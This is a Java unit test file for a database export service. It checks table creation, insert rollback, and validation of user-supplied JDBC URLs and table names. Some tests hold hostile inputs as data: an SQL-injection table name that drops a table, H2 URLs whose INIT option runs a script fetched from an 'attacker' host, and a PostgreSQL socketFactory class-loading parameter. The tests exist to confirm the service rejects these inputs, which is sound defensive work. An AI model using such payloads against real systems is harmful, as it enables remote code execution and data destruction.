package com.modocument.infrastructure.export;

import com.modocument.application.dto.DatabaseExportRequest;
import com.modocument.application.dto.TableData;
import org.junit.jupiter.api.Test;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.jdbc.datasource.SimpleDriverDataSource;

import java.util.List;
import java.util.Map;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

class DatabaseExportServiceTest {

    private final DatabaseExportService service = new DatabaseExportService(
            com.modocument.infrastructure.net.OutboundHostPolicy.disabled());

    private static final TableData TABLE = new TableData(
            List.of("FirstName", "City"),
            List.of(Map.of("FirstName", "Ada", "City", "London"),
                    Map.of("FirstName", "Grace", "City", "Arlington")));

    private static DatabaseExportRequest request(String url, String tableName) {
        DatabaseExportRequest request = new DatabaseExportRequest();
        request.setJdbcUrl(url);
        request.setUsername("sa");
        request.setPassword("");
        request.setTableName(tableName);
        return request;
    }

    @Test
    void createsTableAndInsertsRowsIntoH2() throws Exception {
        String url = "jdbc:h2:mem:dbexport;DB_CLOSE_DELAY=-1";

        int inserted = service.export(TABLE, request(url, "People"));

        assertThat(inserted).isEqualTo(2);
        JdbcTemplate jdbc = new JdbcTemplate(new SimpleDriverDataSource(
                new org.h2.Driver(), url, "sa", ""));
        Integer count = jdbc.queryForObject("SELECT COUNT(*) FROM \"People\"", Integer.class);
        assertThat(count).isEqualTo(2);
        String name = jdbc.queryForObject(
                "SELECT \"FirstName\" FROM \"People\" WHERE \"City\" = 'London'", String.class);
        assertThat(name).isEqualTo("Ada");
    }

    @Test
    void rejectsMaliciousTableName() {
        assertThatThrownBy(() -> service.export(TABLE,
                request("jdbc:h2:mem:dbexport2", "Foo\"; DROP TABLE x; --")))
                .isInstanceOf(IllegalArgumentException.class)
                .hasMessageContaining("Invalid tableName");
    }

    @Test
    void rejectsUnsupportedJdbcUrl() {
        assertThatThrownBy(() -> service.export(TABLE,
                request("jdbc:mysql://evil/db", "People")))
                .isInstanceOf(IllegalArgumentException.class)
                .hasMessageContaining("Unsupported jdbcUrl");
    }

    @Test
    void rejectsJdbcUrlOptionsThatCanRunCode() {
        // H2 runs INIT at connect time, so this option is an SQL/RCE hook.
        assertThatThrownBy(() -> service.export(TABLE, request(
                "jdbc:h2:mem:evil;INIT=RUNSCRIPT_FROM('http://attacker/x.sql')", "People")))
                .isInstanceOf(IllegalArgumentException.class)
                .hasMessageContaining("'INIT' is not allowed");
    }

    @Test
    void rejectsJdbcUrlWithWhitespace() {
        assertThatThrownBy(() -> service.export(TABLE, request(
                "jdbc:h2:mem:evil2;INIT=RUNSCRIPT FROM 'http://attacker/x.sql'", "People")))
                .isInstanceOf(IllegalArgumentException.class)
                .hasMessageContaining("whitespace");
    }

    @Test
    void rejectsPostgresQueryParametersThatLoadClasses() {
        assertThatThrownBy(() -> service.export(TABLE, request(
                "jdbc:postgresql://db/app?socketFactory=org.evil.Factory", "People")))
                .isInstanceOf(IllegalArgumentException.class)
                .hasMessageContaining("'SOCKETFACTORY' is not allowed");
    }

    @Test
    void allowsCommonPostgresConnectionParameters() {
        // Rejected at connect time (no such host), not by URL validation.
        assertThatThrownBy(() -> service.export(TABLE, request(
                "jdbc:postgresql://127.0.0.1:1/app?sslmode=require&connectTimeout=1", "People")))
                .isNotInstanceOf(IllegalArgumentException.class);
    }

    @Test
    void failedInsertLeavesNoPartialRowsBehind() {
        String url = "jdbc:h2:mem:dbexportrollback;DB_CLOSE_DELAY=-1";
        JdbcTemplate jdbc = new JdbcTemplate(new SimpleDriverDataSource(
                new org.h2.Driver(), url, "sa", ""));
        // "Grace" does not fit, so the second row of the batch fails.
        jdbc.execute("CREATE TABLE \"People\" (\"FirstName\" VARCHAR(3), \"City\" VARCHAR(50))");

        assertThatThrownBy(() -> service.export(TABLE, request(url, "People")))
                .isInstanceOf(RuntimeException.class);

        Integer count = jdbc.queryForObject("SELECT COUNT(*) FROM \"People\"", Integer.class);
        assertThat(count).isZero();
    }

    @Test
    void rejectsEmptyTable() {
        assertThatThrownBy(() -> service.export(new TableData(List.of(), List.of()),
                request("jdbc:h2:mem:dbexport3", "People")))
                .isInstanceOf(IllegalStateException.class);
    }
}
